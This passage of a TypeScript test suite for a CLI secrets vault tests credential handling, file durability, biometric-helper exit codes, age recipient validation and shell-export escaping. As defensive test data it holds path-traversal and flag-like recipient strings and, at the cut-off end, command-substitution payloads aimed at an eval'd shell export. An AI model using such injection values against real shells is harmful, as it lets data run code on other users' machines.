    assert.equal(identityPlugin(write("AGE-PLUGIN--LEADINGDASH-1XXXX")), null, "accepted a leading dash");
    assert.equal(identityPlugin(write("AGE-PLUGIN-YUBIKEY-1XXXX")), "yubikey", "rejected a legitimate name");
    rmSync(dir, { recursive: true, force: true });
  });

  test("a signal sent to hush reaches the child", async () => {
    // The earlier test had the child kill itself, which needs no forwarding.
    // This signals a real hush process and checks the grandchild dies with it —
    // an orphan here keeps running while holding every injected credential.
    //
    // The child reports its own pid through a file rather than being counted
    // with `pgrep -f <tag>`. That matched the `sh -c "pgrep -f <tag>"` doing the
    // counting as well, because the tag is in that shell's own command line, so
    // the count could never reliably reach zero — it passed locally and failed
    // on every CI runner.
    const dir = scratch();
    const home = scratch();
    mkdirSync(join(dir, ".hush"), { recursive: true });
    const owner = generateIdentity();
    Vault.create(join(dir, ".hush", "vault.json"), "sig", { name: "a", pub: owner.pub }).save();

    const pidFile = join(dir, "child.pid");
    const runner = spawn(
      process.execPath,
      [
        join(import.meta.dirname, "..", "src", "cli.ts"),
        "run", "--", process.execPath, "-e",
        `require("fs").writeFileSync(${JSON.stringify(pidFile)}, String(process.pid));` +
          `setInterval(() => {}, 1000);`,
      ],
      {
        cwd: dir,
        stdio: "ignore",
        env: {
          ...process.env,
          HUSH_HOME: home,
          HUSH_IDENTITY: encodeSecret(owner),
          HUSH_NO_NUDGE: "1",
          HUSH_NO_KEYCHAIN: "1",
          NO_COLOR: "1",
        },
      },
    );

    const settle = (ms: number) => new Promise((r) => setTimeout(r, ms));
    /** Signal 0 tests for existence without delivering anything. */
    const running = (pid: number): boolean => {
      try {
        process.kill(pid, 0);
        return true;
      } catch {
        return false;
      }
    };

    try {
      let pid = 0;
      for (let i = 0; i < 100 && !pid; i++) {
        await settle(100);
        if (existsSync(pidFile)) pid = Number(readFileSync(pidFile, "utf8").trim());
      }
      assert.ok(pid > 0, "the child never started, so the test proves nothing");
      assert.ok(running(pid), "the child was gone before it was signalled");

      runner.kill("SIGTERM");
      let alive = true;
      for (let i = 0; i < 100 && alive; i++) {
        await settle(100);
        alive = running(pid);
      }
      assert.equal(alive, false, "the child outlived hush — orphaned holding credentials");
    } finally {
      runner.kill("SIGKILL");
      for (const d of [dir, home]) rmSync(d, { recursive: true, force: true });
    }
  });
});

describe("tagging is metadata, not ciphertext", () => {
  test("a tag can be changed by someone who cannot decrypt the vault", () => {
    // The strongest statement of the property: retag() touches no ciphertext,
    // so it needs no data key — which is why relabelling must never make a
    // hardware-backed identity prompt for a touch.
    const dir = scratch();
    const owner = generateIdentity();
    const stranger = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "a", pub: owner.pub });
    vault.set(owner, "default", "K", "the-secret", "old tag");

    assert.equal(vault.canRead(stranger), false);
    assert.throws(() => vault.get(stranger, "default", "K"), /not a recipient/);

    assert.equal(vault.retag("default", "K", "new tag"), true, "retag needed a key it should not need");
    assert.equal(vault.list("default")[0].note, "new tag");
    // And the value is untouched.
    assert.equal(vault.get(owner, "default", "K"), "the-secret");
    rmSync(dir, { recursive: true, force: true });
  });

  test("clearing a tag removes it rather than storing an empty one", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "a", pub: owner.pub });
    vault.set(owner, "default", "K", "v", "a tag");
    vault.retag("default", "K", "   ");
    assert.equal(vault.list("default")[0].note, undefined);
    vault.save();
    assert.ok(!readFileSync(join(dir, "v.json"), "utf8").includes('"note"'));
    rmSync(dir, { recursive: true, force: true });
  });

  test("retagging a key that does not exist reports so", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "a", pub: owner.pub });
    assert.equal(vault.retag("default", "NOPE", "x"), false);
    rmSync(dir, { recursive: true, force: true });
  });

  test("a tag is capped, wherever it is set from", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "a", pub: owner.pub });
    vault.set(owner, "default", "A", "v", "z".repeat(5000));
    vault.retag("default", "A", "y".repeat(5000));
    assert.equal(vault.list("default")[0].note!.length, 200);
    vault.set(owner, "default", "B", "v", "w".repeat(5000));
    assert.equal(vault.list("default").find((s) => s.key === "B")!.note!.length, 200);
    rmSync(dir, { recursive: true, force: true });
  });

  test("a retag survives a concurrent write, like any other edit", () => {
    const dir = scratch();
    const path = join(dir, "v.json");
    const owner = generateIdentity();
    const seed = Vault.create(path, "t", { name: "a", pub: owner.pub });
    seed.set(owner, "default", "K", "v", "original");
    seed.save();

    const a = Vault.open(path);
    const b = Vault.open(path);
    a.set(owner, "default", "OTHER", "x");
    a.save();
    b.retag("default", "K", "relabelled");
    b.save();

    const fresh = Vault.open(path);
    assert.equal(fresh.list("default").find((s) => s.key === "K")!.note, "relabelled");
    assert.equal(fresh.get(owner, "default", "OTHER"), "x", "the other write was lost");
    rmSync(dir, { recursive: true, force: true });
  });

  test("a value over the size limit is refused", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "a", pub: owner.pub });
    assert.throws(() => vault.set(owner, "default", "HUGE", "x".repeat(1024 * 1024 + 1)), /over the .* limit/);
    assert.doesNotThrow(() => vault.set(owner, "default", "FINE", "x".repeat(100_000)));
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("gaps found by the broad mutation sweep", () => {
  test("the ladder cannot skip a failed rung, however good the later ones are", () => {
    process.env.HUSH_BIOMETRY = "off";
    process.env.HUSH_IDENTITY = encodeSecret(generateIdentity());
    const dir = scratch();
    const hushDir = join(dir, ".hush");
    mkdirSync(hushDir, { recursive: true });
    const owner = generateIdentity();
    const vault = Vault.create(join(hushDir, "vault.json"), "t", { name: "a", pub: owner.pub });

    // Fail rung 1 only; everything above it is irrelevant while it stands.
    writeFileSync(join(dir, ".env"), "FOO=bar");
    const p = assess(vault, hushDir, dir);
    const failed = p.checks.filter((c) => !c.pass).map((c) => c.rung);
    assert.ok(failed.includes(1), "expected the rung-1 check to fail");
    assert.equal(p.rung, 0, "a later passing rung lifted the score past a failed one");

    // And the reported score never exceeds the lowest failing rung minus one.
    const lowestFailure = Math.min(...failed);
    assert.ok(p.rung < lowestFailure, `rung ${p.rung} is not below the first failure at ${lowestFailure}`);

    rmSync(dir, { recursive: true, force: true });
    delete process.env.HUSH_BIOMETRY;
    delete process.env.HUSH_IDENTITY;
  });

  test('a one-off approval is not remembered, only "allow 15 min" is', async () => {
    process.env.HUSH_BIOMETRY = "off";
    process.env.HUSH_APPROVAL_MODE = "file";
    clearApprovalCache();
    const dir = scratch();

    const answer = async (decision: "once" | "session") => {
      const p = requestApproval(dir, {
        action: "run", summary: "x", scope: "run:same-scope", ttlSeconds: 900, timeoutMs: 5000,
      });
      let seen: ReturnType<typeof pendingRequests> = [];
      for (let i = 0; i < 40 && !seen.length; i++) {
        seen = pendingRequests(dir);
        if (!seen.length) await new Promise((r) => setTimeout(r, 25));
      }
      answerRequest(dir, seen[0].id, decision);
      return p;
    };

    assert.equal((await answer("once")).decision, "once");
    // A second request for the same scope must ask again.
    const second = await requestApproval(dir, {
      action: "run", summary: "x", scope: "run:same-scope", ttlSeconds: 900, timeoutMs: 600,
    });
    assert.equal(second.cached, false, '"allow once" was cached as if it were a session');
    assert.equal(second.decision, "timeout");

    rmSync(dir, { recursive: true, force: true });
    delete process.env.HUSH_BIOMETRY;
    delete process.env.HUSH_APPROVAL_MODE;
  });

  test("common configuration values are not masked as if they were secrets", () => {
    // Masking "localhost" or "false" would make ordinary output unreadable.
    const r = new Redactor({
      A: "false", B: "localhost", C: "undefined", D: "null", E: "true", F: "0", G: "",
    });
    assert.equal(r.size, 0, "would have redacted ordinary values");
    const line = "connecting to localhost, debug=false, value=undefined, flag=null";
    assert.equal(r.push(line) + r.flush(), line);
  });

  test("a real secret that happens to be long enough is still masked", () => {
    const r = new Redactor({ REAL: "s3cr3t" });
    assert.equal(r.size, 1);
    assert.equal(r.push("x s3cr3t y") + r.flush(), "x [redacted:REAL] y");
  });
});

describe("identity: where the private key lives", () => {
  /** A fresh HUSH_HOME, with the keychain deliberately out of the picture. */
  const withHome = <T,>(fn: (home: string) => T): T => {
    const home = mkdtempSync(join(tmpdir(), "hush-id-"));
    const saved = { home: process.env.HUSH_HOME, no: process.env.HUSH_NO_KEYCHAIN,
                    id: process.env.HUSH_IDENTITY, file: process.env.HUSH_IDENTITY_FILE };
    process.env.HUSH_HOME = home;
    process.env.HUSH_NO_KEYCHAIN = "1";
    delete process.env.HUSH_IDENTITY;
    delete process.env.HUSH_IDENTITY_FILE;
    try {
      return fn(home);
    } finally {
      for (const [k, v] of [["HUSH_HOME", saved.home], ["HUSH_NO_KEYCHAIN", saved.no],
                            ["HUSH_IDENTITY", saved.id], ["HUSH_IDENTITY_FILE", saved.file]] as const) {
        if (v === undefined) delete process.env[k];
        else process.env[k] = v;
      }
      rmSync(home, { recursive: true, force: true });
    }
  };

  test("the key file is readable only by its owner", () => {
    // 0600. A private key at 0644 is readable by every account on a shared box,
    // and nothing else in hush would ever notice.
    withHome((home) => {
      createIdentity();
      const mode = statSync(join(home, "identity")).mode & 0o777;
      assert.equal(mode.toString(8), "600", `the identity file is mode ${mode.toString(8)}`);
    });
  });

  test("creating an identity over an existing one needs --force", () => {
    // This is the one operation that can destroy the only copy of a key.
    withHome(() => {
      const first = publicKeyOf(createIdentity());
      assert.throws(() => createIdentity(), /already exists/);
      assert.equal(publicKeyOf(loadIdentity()!), first, "the key changed without --force");

      const replaced = publicKeyOf(createIdentity("default", true));
      assert.notEqual(replaced, first, "--force did not actually replace it");
    });
  });

  test("HUSH_IDENTITY_FILE pointing at nothing is an error, not a silent fallback", () => {
    // Falling through would quietly use a *different* key — so a CI job that
    // mounted its key at the wrong path would report "not a recipient" instead
    // of "that file is not there", which is a much longer afternoon.
    withHome(() => {
      createIdentity();
      process.env.HUSH_IDENTITY_FILE = join(tmpdir(), "definitely-not-here-" + Date.now());
      assert.throws(() => loadIdentity(), /HUSH_IDENTITY_FILE not found/);
    });
  });

  test("resolution order: the environment beats a file on disk", () => {
    withHome(() => {
      const onDisk = publicKeyOf(createIdentity());
      const other = generateIdentity();
      process.env.HUSH_IDENTITY = encodeSecret(other);
      const loaded = loadIdentity()!;
      assert.equal(publicKeyOf(loaded), encodePub(other.pub), "the file won over the environment");
      assert.notEqual(publicKeyOf(loaded), onDisk);
      assert.match(loaded.source, /HUSH_IDENTITY/);
    });
  });

  test(
    "the age identity is resolved once and cached, so hush ls never re-touches a YubiKey",
    { skip: ageAvailable() ? false : "age binary not installed" },
    () => {
      // Reading `.age` can shell out to age and, for a hardware-backed identity,
      // make the key prompt. So it must be a getter (not resolved eagerly on
      // every loadIdentity) *and* memoised (not re-resolved on every read).
      //
      // Testing this needs a real age identity: with none present the resolver
      // returns undefined every time, and "cached undefined" is indistinguishable
      // from "recomputed undefined" — which is exactly how the eager version
      // survived a test that looked like it covered this.
      withHome((home) => {
        createIdentity();
        const keyFile = join(home, "age-identity.txt");
        execFileSync("age-keygen", ["-o", keyFile], { stdio: "ignore" });
        process.env.HUSH_AGE_IDENTITY = keyFile;
        try {
          const id = loadIdentity()!;
          assert.ok(
            Object.getOwnPropertyDescriptor(id, "age")?.get,
            "age is a plain value, so it was resolved eagerly on load",
          );
          const first = id.age;
          assert.ok(first?.recipients.length, "the age identity did not resolve at all");
          // Reference identity is the whole point: a re-resolve builds a new
          // object, and that is one more shell-out to age per read.
          assert.equal(id.age, first, "the age identity was resolved more than once");
          assert.equal(id.age, first);
        } finally {
          delete process.env.HUSH_AGE_IDENTITY;
        }
      });
    },
  );
});

describe("biometry: what the helper's exit status means", { skip: platform() === "darwin" ? false : "macOS only" }, () => {
  /**
   * Stand a stub in for the compiled Swift helper.
   *
   * `ensureHelper` accepts a cached binary when its stamp matches the digest of
   * the source, so writing both takes the real Touch ID prompt out of the picture
   * and lets every exit status be driven deliberately. Without it the mapping
   * from exit status to decision is untestable: a machine either has an enrolled
   * finger or it does not, and neither state exercises the failure arm.
   *
   * It is async on purpose. Restoring HUSH_HOME synchronously while the helper
   * is still being spawned pointed the lookup back at the real home, the spawn
   * failed, and every exit status came back "denied" — a test that looked like
   * it was exercising the mapping while exercising nothing at all.
   */
  const withStubHelper = async <T,>(script: string, fn: () => T | Promise<T>): Promise<T> => {
    const home = mkdtempSync(join(tmpdir(), "hush-bio-"));
    const saved = { home: process.env.HUSH_HOME, off: process.env.HUSH_BIOMETRY };
    process.env.HUSH_HOME = home;
    delete process.env.HUSH_BIOMETRY;
    try {
      const src = join(dirname(fileURLToPath(import.meta.url)), "..", "native", "hush-touchid.swift");
      const digest = createHash("sha256").update(readFileSync(src)).digest("hex").slice(0, 16);
      const bin = join(home, "bin");
      mkdirSync(bin, { recursive: true, mode: 0o700 });
      writeFileSync(join(bin, "hush-touchid"), script, { mode: 0o755 });
      writeFileSync(join(bin, "hush-touchid.stamp"), digest);
      return await fn();
    } finally {
      if (saved.home === undefined) delete process.env.HUSH_HOME; else process.env.HUSH_HOME = saved.home;
      if (saved.off === undefined) delete process.env.HUSH_BIOMETRY; else process.env.HUSH_BIOMETRY = saved.off;
      rmSync(home, { recursive: true, force: true });
    }
  };

  test("exit 0 is approval, exit 2 is unavailable, anything else is a denial", async () => {
    // Collapsing these is the dangerous direction: reading a failure as "ok"
    // turns any crash of the helper into a granted approval.
    for (const [code, expected] of [[0, "ok"], [2, "unavailable"], [1, "denied"], [9, "denied"]] as const) {
      const got = await withStubHelper(`#!/bin/sh\nexit ${code}\n`, () => authenticate("testing", 5000));
      assert.equal(got, expected, `exit ${code} was read as "${got}"`);
    }
  });

  test("no enrolled finger is reported as unavailable, not as available", async () => {
    // "yes 1" is the enrolled answer; anything else must not tick the box.
    const enrolled = await withStubHelper('#!/bin/sh\necho "yes 1"\n', () => biometryStatus());
    assert.equal(enrolled.available, true);
    assert.equal(enrolled.kind, "Touch ID");

    const faceId = await withStubHelper('#!/bin/sh\necho "yes 2"\n', () => biometryStatus());
    assert.equal(faceId.kind, "Face ID");

    for (const answer of ["no 0", "", "maybe"]) {
      const st = await withStubHelper(`#!/bin/sh\necho "${answer}"\n`, () => biometryStatus());
      assert.equal(st.available, false, `"${answer}" was read as an enrolled finger`);
      assert.equal(st.kind, "none");
    }
  });

  test("a helper whose source has changed is not reused", () => {
    // The stamp is what stops a stale binary from being trusted after the Swift
    // source is edited — including an edit that removes the prompt entirely.
    const home = mkdtempSync(join(tmpdir(), "hush-bio-stale-"));
    const saved = { home: process.env.HUSH_HOME, off: process.env.HUSH_BIOMETRY };
    process.env.HUSH_HOME = home;
    delete process.env.HUSH_BIOMETRY;
    const planted = "#!/bin/sh\nexit 0\n";
    try {
      const bin = join(home, "bin");
      mkdirSync(bin, { recursive: true, mode: 0o700 });
      writeFileSync(join(bin, "hush-touchid"), planted, { mode: 0o755 });
      writeFileSync(join(bin, "hush-touchid.stamp"), "0000000000000000");

      const r = ensureHelper();
      if (r.ok) {
        // It recompiled, so the binary is no longer the stub we planted.
        assert.notEqual(readFileSync(join(bin, "hush-touchid"), "utf8"), planted);
        assert.equal(readFileSync(join(bin, "hush-touchid.stamp"), "utf8").trim().length, 16);
      } else {
        assert.match(r.reason ?? "", /swiftc|compile/);
      }
    } finally {
      if (saved.home === undefined) delete process.env.HUSH_HOME; else process.env.HUSH_HOME = saved.home;
      if (saved.off === undefined) delete process.env.HUSH_BIOMETRY; else process.env.HUSH_BIOMETRY = saved.off;
      rmSync(home, { recursive: true, force: true });
    }
  });

  test("HUSH_BIOMETRY=off is honoured even with a helper sitting right there", async () => {
    const result = await withStubHelper("#!/bin/sh\nexit 0\n", async () => {
      process.env.HUSH_BIOMETRY = "off";
      try {
        return { auth: await authenticate("testing", 5000), status: biometryStatus() };
      } finally {
        delete process.env.HUSH_BIOMETRY;
      }
    });
    assert.equal(result.auth, "unavailable", "the opt-out was ignored");
    assert.equal(result.status.available, false);
    assert.match(result.status.reason ?? "", /HUSH_BIOMETRY=off/);
  });
});

describe("nudges: when hush is allowed to interrupt you", () => {
  /** A scratch HUSH_HOME so the nudge state file is ours alone. */
  const withState = <T,>(state: Record<string, unknown> | null, fn: () => T): T => {
    const home = mkdtempSync(join(tmpdir(), "hush-nudge-"));
    const saved = { home: process.env.HUSH_HOME, no: process.env.HUSH_NO_NUDGE, ci: process.env.CI };
    process.env.HUSH_HOME = home;
    delete process.env.HUSH_NO_NUDGE;
    delete process.env.CI;
    try {
      if (state) writeFileSync(join(home, "state.json"), JSON.stringify(state));
      return fn();
    } finally {
      for (const [k, v] of [["HUSH_HOME", saved.home], ["HUSH_NO_NUDGE", saved.no], ["CI", saved.ci]] as const) {
        if (v === undefined) delete process.env[k]; else process.env[k] = v;
      }
      rmSync(home, { recursive: true, force: true });
    }
  };

  /** A posture at a given rung and risk weight, with a next step to nag about. */
  const posture = (rung: number, weight: number) => ({
    rung,
    name: "test",
    checks: [],
    next: rung === 5 ? null : { id: "x", rung: rung + 1, label: "next", gap: "a gap" },
    risk: { weight, reasons: [] },
  }) as unknown as Parameters<typeof shouldNudge>[0];

  const daysAgo = (n: number) => new Date(Date.now() - n * 86_400_000).toISOString();

  test("the top rung is never nudged", () => {
    // Reaching the top and still being nagged is how a tool trains you to
    // ignore it. There is nothing left to suggest, so there is nothing to say.
    withState(null, () => {
      assert.equal(shouldNudge(posture(5, 3)), false, "nudged someone who has finished");
      assert.equal(shouldNudge(posture(4, 3)), true, "the check is refusing everything");
    });
  });

  test("higher risk means a shorter quiet period", () => {
    // The whole point of weighting: a vault of feature flags gets a weekly
    // hint, three live payment keys shared with four people gets a daily one.
    // A flat interval treats both the same and is wrong in one direction or
    // the other whichever value it picks.
    for (const [weight, quietDays] of [[0, 7], [1, 3], [2, 1], [3, 1]] as const) {
      withState({ lastNudge: daysAgo(quietDays - 0.5), lastRung: 1 }, () => {
        assert.equal(
          shouldNudge(posture(1, weight)),
          false,
          `weight ${weight}: nudged again inside its ${quietDays}-day window`,
        );
      });
      withState({ lastNudge: daysAgo(quietDays + 0.5), lastRung: 1 }, () => {
        assert.equal(
          shouldNudge(posture(1, weight)),
          true,
          `weight ${weight}: stayed quiet past its ${quietDays}-day window`,
        );
      });
    }
  });

  test("the opt-out and CI silence it completely", () => {
    withState({ lastNudge: daysAgo(400), lastRung: 1 }, () => {
      assert.equal(shouldNudge(posture(1, 3)), true, "the baseline case does not nudge");
      process.env.HUSH_NO_NUDGE = "1";
      assert.equal(shouldNudge(posture(1, 3)), false, "HUSH_NO_NUDGE was ignored");
      delete process.env.HUSH_NO_NUDGE;
      process.env.CI = "true";
      assert.equal(shouldNudge(posture(1, 3)), false, "it nagged a CI log");
      delete process.env.CI;
    });
  });

  test("a snooze is honoured until it lapses", () => {
    withState({ lastNudge: daysAgo(400), snoozedUntil: new Date(Date.now() + 86_400_000).toISOString() }, () => {
      assert.equal(shouldNudge(posture(1, 3)), false, "a live snooze was ignored");
    });
    withState({ lastNudge: daysAgo(400), snoozedUntil: daysAgo(1) }, () => {
      assert.equal(shouldNudge(posture(1, 3)), true, "an expired snooze silenced it for ever");
    });
  });

  test("climbing a rung is acknowledged immediately, whatever the interval says", () => {
    withState({ lastNudge: new Date().toISOString(), lastRung: 1 }, () => {
      assert.equal(shouldNudge(posture(2, 0)), true, "moving up went unremarked");
    });
  });
});

describe("vault durability: how the file reaches disk", () => {
  const rig = () => {
    const dir = scratch();
    const path = join(dir, "vault.json");
    const owner = generateIdentity();
    const v = Vault.create(path, "t", { name: "a", pub: owner.pub });
    v.set(owner, "default", "KEY_ONE", "value-one-long-enough");
    v.save();
    return { dir, path, owner };
  };

  test("the file is only ever replaced whole, never truncated in place", () => {
    // A plain writeFileSync truncates first, so a crash, a full disk, or a
    // reader arriving mid-write sees a partial file — and a partial vault means
    // every secret in it is gone. The observable consequence of rename(2) is
    // that the inode changes: the old file is replaced, not edited.
    const { dir, path, owner } = rig();
    try {
      const before = statSync(path).ino;
      const v = Vault.open(path);
      v.set(owner, "default", "KEY_TWO", "value-two-long-enough");
      v.save();
      assert.notEqual(statSync(path).ino, before, "the vault was written in place rather than replaced");
      assert.equal(Vault.open(path).get(owner, "default", "KEY_ONE"), "value-one-long-enough");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("no temporary file is left behind, and the vault keeps its own permissions", () => {
    const { dir, path, owner } = rig();
    try {
      const v = Vault.open(path);
      v.set(owner, "default", "KEY_TWO", "value-two-long-enough");
      v.save();
      const strays = readdirSync(dir).filter((n) => n.endsWith(".tmp"));
      assert.deepEqual(strays, [], `temporary files left behind: ${strays.join(", ")}`);

      // The temp file becomes the vault, so its mode is the vault's mode. The
      // file holds only ciphertext, but it also holds the member list, and there
      // is no reason for it to be writable by anyone else.
      const mode = statSync(path).mode & 0o777;
      assert.ok((mode & 0o077) === 0, `the vault is mode ${mode.toString(8)}`);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test(
    "a write that fails at the rename leaves the old vault intact and no temp file",
    { skip: platform() === "darwin" ? false : "needs chflags to make a rename fail" },
    () => {
      // Reaching the cleanup at all takes care. Every obvious way to break a
      // save — a directory where the vault should be, an unwritable parent —
      // throws before the temp file is ever created, so the cleanup never runs
      // and a test built on one of those passes without exercising anything.
      // This one fails at exactly the right moment: the temp file is written and
      // fsynced, and then the rename onto an immutable destination is refused.
      const { dir, path, owner } = rig();
      try {
        execFileSync("chflags", ["uchg", path]);
        try {
          const v = Vault.open(path);
          v.set(owner, "default", "KEY_TWO", "value-two-long-enough");
          assert.throws(() => v.save(), /EPERM/);

          const strays = readdirSync(dir).filter((n) => n.includes(".tmp"));
          assert.deepEqual(strays, [], `a temp copy of the whole vault was left behind: ${strays.join(", ")}`);
        } finally {
          execFileSync("chflags", ["nouchg", path]);
        }

        // The old vault is untouched and still readable.
        const survivor = Vault.open(path);
        assert.equal(survivor.get(owner, "default", "KEY_ONE"), "value-one-long-enough");
        assert.equal(survivor.has("default", "KEY_TWO"), false);
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    },
  );

  test("saving twice in a row does not replay the first save's edits", () => {
    // The journal is what lets a concurrent write be merged instead of lost. If
    // it is not cleared afterwards, the second save replays the first save's
    // edits onto whatever is on disk — quietly resurrecting a value someone
    // else deleted in between.
    const { dir, path, owner } = rig();
    try {
      const mine = Vault.open(path);
      mine.set(owner, "default", "KEY_TWO", "value-two-long-enough");
      mine.save();

      // Someone else deletes it, then I save again for an unrelated reason.
      const theirs = Vault.open(path);
      theirs.delete("default", "KEY_TWO");
      theirs.save();

      mine.set(owner, "default", "KEY_THREE", "value-three-long-enough");
      mine.save();

      const fresh = Vault.open(path);
      assert.equal(fresh.has("default", "KEY_TWO"), false, "a deleted value came back from a stale journal");
      assert.equal(fresh.get(owner, "default", "KEY_THREE"), "value-three-long-enough");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("the baseline moves with each save, so the next one is not a false conflict", () => {
    // The baseline is the hash of what we last wrote. Left stale, every save
    // after the first looks like someone else changed the file underneath us.
    const { dir, path, owner } = rig();
    try {
      const v = Vault.open(path);
      for (let i = 0; i < 5; i++) {
        v.set(owner, "default", `KEY_${i}`, `value-${i}-long-enough`);
        v.save();
      }
      const fresh = Vault.open(path);
      for (let i = 0; i < 5; i++) {
        assert.equal(fresh.get(owner, "default", `KEY_${i}`), `value-${i}-long-enough`);
      }
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("a merge that needs a key refuses when it has none", () => {
    // Replaying a `set` means re-sealing the value, which needs an identity. A
    // merge that skips the check writes an entry with no usable ciphertext.
    const { dir, path, owner } = rig();
    try {
      const a = Vault.open(path);
      const b = Vault.open(path);
      a.set(owner, "default", "FROM_A", "value-a-long-enough");
      a.save();

      // b has a queued set but no opener recorded — the shape a caller reaches
      // by constructing the edit without ever passing an identity.
      b.set(owner, "default", "FROM_B", "value-b-long-enough");
      (b as unknown as { opener: unknown }).opener = null;
      assert.throws(() => b.save(), /cannot be merged automatically|Re-run/);

      // And nothing was written: the vault on disk still has only a's edit.
      const fresh = Vault.open(path);
      assert.equal(fresh.has("default", "FROM_B"), false);
      assert.equal(fresh.get(owner, "default", "FROM_A"), "value-a-long-enough");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("age: what counts as a recipient, and where the binary comes from", () => {
  test("a recipient must look like a real age recipient, not merely start with age1", () => {
    // This string is used as an argument to `age -r`, and it is also what
    // decides whether a member is wrapped natively or through age at all. A
    // pattern loose enough to match "age1" matches a flag, a path, or an empty
    // account name.
    for (const bad of [
      "age1", "age1!", "age1 --", "age1/../../etc/passwd", "age1UPPERCASE",
      "-age1zzzz", "age1\nage1", "", "AGE1" + "z".repeat(58),
    ]) {
      assert.equal(isAgeRecipient(bad), false, `accepted ${JSON.stringify(bad)} as a recipient`);
    }
    // A real one, and a plugin one, both still match.
    assert.equal(isAgeRecipient("age1" + "qwertyuiop".repeat(5)), true);
    assert.equal(isAgeRecipient("  age1" + "a".repeat(50) + "  "), true, "surrounding space should be tolerated");
  });

  test("an age fingerprint cannot collide with a hush one for the same bytes", () => {
    // Both land in the same wraps map. Without the domain prefix, a recipient
    // string that happened to equal a hush public key's text would index the
    // same slot — one member's wrap silently overwriting another's.
    const raw = "age1" + "z".repeat(58);
    assert.notEqual(ageFingerprint(raw), createHash("sha256").update(raw).digest("hex").slice(0, 16));
    // Stable, and distinct per recipient.
    assert.equal(ageFingerprint(raw), ageFingerprint("  " + raw + "  "));
    assert.notEqual(ageFingerprint(raw), ageFingerprint("age1" + "y".repeat(58)));
  });

  test("a directory or a non-executable file on PATH is not mistaken for the binary", () => {
    const dir = scratch();
    const saved = { path: process.env.PATH, bin: process.env.HUSH_AGE_BIN };
    try {
      delete process.env.HUSH_AGE_BIN;
      // A file called "age" that cannot be executed, and a directory of the
      // same name: both are on PATH, neither is the program.
      writeFileSync(join(dir, "age"), "#!/bin/sh\necho nope\n", { mode: 0o644 });
      process.env.PATH = dir;
      resetAgeBinaryCache();
      assert.equal(ageBinary(), null, "a non-executable file was taken for the age binary");

      rmSync(join(dir, "age"));
      mkdirSync(join(dir, "age"), { mode: 0o755 });
      resetAgeBinaryCache();
      assert.equal(ageBinary(), null, "a directory was taken for the age binary");

      // HUSH_AGE_BIN takes the same route and needs the same check: merely
      // existing is satisfied by a directory.
      process.env.HUSH_AGE_BIN = join(dir, "age");
      resetAgeBinaryCache();
      assert.equal(ageBinary(), null, "HUSH_AGE_BIN accepted a directory");
      writeFileSync(join(dir, "real-age"), "#!/bin/sh\nexit 0\n", { mode: 0o755 });
      process.env.HUSH_AGE_BIN = join(dir, "real-age");
      resetAgeBinaryCache();
      assert.equal(ageBinary(), join(dir, "real-age"), "HUSH_AGE_BIN was ignored for a real program");
    } finally {
      if (saved.path === undefined) delete process.env.PATH; else process.env.PATH = saved.path;
      if (saved.bin === undefined) delete process.env.HUSH_AGE_BIN; else process.env.HUSH_AGE_BIN = saved.bin;
      resetAgeBinaryCache();
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('"age is not installed" is rechecked, not remembered for the session', () => {
    // The MCP server is long-lived. Telling someone to `brew install age` and
    // then never noticing that they did — for the rest of the session — is a
    // bad answer.
    const dir = scratch();
    const saved = { path: process.env.PATH, bin: process.env.HUSH_AGE_BIN };
    try {
      delete process.env.HUSH_AGE_BIN;
      process.env.PATH = dir;
      resetAgeBinaryCache();
      assert.equal(ageBinary(), null);

      // Now it appears, the way it would after an install.
      writeFileSync(join(dir, "age"), "#!/bin/sh\nexit 0\n", { mode: 0o755 });
      const found = (): string | null => {
        for (let i = 0; i < 40; i++) {
          const r = ageBinary();
          if (r) return r;
          const until = Date.now() + 200;
          while (Date.now() < until) { /* the negative cache has a short life */ }
        }
        return null;
      };
      assert.equal(found(), join(dir, "age"), "a negative result was cached for the whole session");
    } finally {
      if (saved.path === undefined) delete process.env.PATH; else process.env.PATH = saved.path;
      if (saved.bin === undefined) delete process.env.HUSH_AGE_BIN; else process.env.HUSH_AGE_BIN = saved.bin;
      resetAgeBinaryCache();
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("a vault with age recipients refuses clearly when age is missing", () => {
    // Failing closed is the requirement: the alternative is a vault that looks
    // like it saved but wrapped the data key for nobody.
    const dir = scratch();
    const saved = { path: process.env.PATH, bin: process.env.HUSH_AGE_BIN };
    try {
      delete process.env.HUSH_AGE_BIN;
      process.env.PATH = dir;
      resetAgeBinaryCache();
      assert.throws(() => wrapDekWithAge(newDek(), "age1" + "z".repeat(58)), /not installed/);
      assert.throws(() => unwrapDekWithAge("whatever", join(dir, "nope")), /not installed/);
    } finally {
      if (saved.path === undefined) delete process.env.PATH; else process.env.PATH = saved.path;
      if (saved.bin === undefined) delete process.env.HUSH_AGE_BIN; else process.env.HUSH_AGE_BIN = saved.bin;
      resetAgeBinaryCache();
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("shell export is eval'd, so a value must not be able to run anything", () => {
  // `hush hook` installs a shell function that does `eval "$(hush export
  // --shell)"` on every directory change. Both halves of each line are a
  // code-execution surface, and only the name half used to be handled: values
  // went through JSON.stringify, which produces a *double*-quoted shell string,
  // and inside double quotes a shell still expands $, backticks and backslashes.
  //
  // Writing a value is something any member can do, so this turned "can add a
  // secret" into "can run code as everyone on the team".
  const BACKTICK = String.fromCharCode(96);
  const QUOTE = String.fromCharCode(39);

  /** Built per-run so the payloads point at this run's canary path. */
  const hostileFor = (canary: string): Record<string, string> => ({
    SUBSHELL: "$(touch " + canary + ")",
    BACKTICKS: BACKTICK + "touch " + canary + BACKTICK,
